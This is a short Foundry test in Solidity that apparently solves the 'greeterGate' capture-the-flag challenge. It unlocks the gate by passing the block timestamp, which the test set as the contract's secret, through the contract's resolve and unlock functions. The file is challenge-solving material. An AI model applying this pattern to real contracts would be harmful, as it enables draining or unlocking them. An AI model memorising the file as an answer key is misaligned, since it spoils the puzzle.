// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Gate} from "greeterGate/contracts/greeterGate.sol";

contract greeterGateTest is Test {
    Gate public greeterGate;
    address public player = address(42);

    function setUp() public {
    }

    function test_GreeterGateSolution() public {
        bytes memory _data = abi.encode(block.timestamp);
        greeterGate = new Gate(bytes32(""), bytes32(""),bytes32(_data));
        vm.prank(player);
        this.attack();
        assertTrue(greeterGate.isSolved());

    }

    function attack() public {
        bytes memory _data = abi.encode(block.timestamp);
        bytes memory call = abi.encodeCall(Gate.unlock, _data);
        greeterGate.resolve(call);

    }
}

